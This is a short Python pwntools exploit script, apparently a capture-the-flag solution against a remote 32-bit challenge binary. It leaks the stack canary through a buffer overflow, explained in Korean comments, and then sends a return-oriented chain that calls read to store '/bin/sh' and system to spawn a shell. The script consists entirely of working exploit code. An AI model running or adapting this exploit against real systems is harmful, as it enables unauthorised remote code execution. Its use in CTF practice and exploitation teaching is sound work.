from pwn import*

#gcc -m32 -mpreferred-stack-boundary=2 -no-pie -o

#coding: utf-8 
import sys 
reload(sys) 
sys.setdefaultencoding('utf-8')

#p = process("./pwn1")
p = remote("chall.kuality.kr", 12348)
e = ELF("pwn1")

system_p = 0x8048580
pppr = 0x8048989
check = 0x0804A0a0
read_p = 0x8048510

p.recvuntil("name?")
p.send("a"*0x40+"B")    
p.send("1aaaaaaa")  #name에 0x41byte만큼 넣고 atoi함수는 영문자를 바꾸지 않는다는 것을 이용하여 8byte모두 채워주면 canary를 릭할 수 있다.

p.recvuntil("B")
canary = u32(p.recv(3).rjust(4,'\x00'))

p.recvuntil("again?")
payload = ""
payload+="A"*0x40
payload+= p32(canary)
payload+="A"*0x8
#strcmp는 다른 문자열과 비교하여 -1, 0, 1이 나오므로 -1이 나오게 유도하여 payload를 넣을 수 있다.

payload+= p32(read_p)
payload+= p32(pppr)
payload+= p32(0)
payload+= p32(check)
payload+= p32(8)

payload+= p32(system_p)
payload+= "AAAA"
payload+= p32(check)

p.send(payload)
p.send("/bin/sh\x00")

p.interactive()
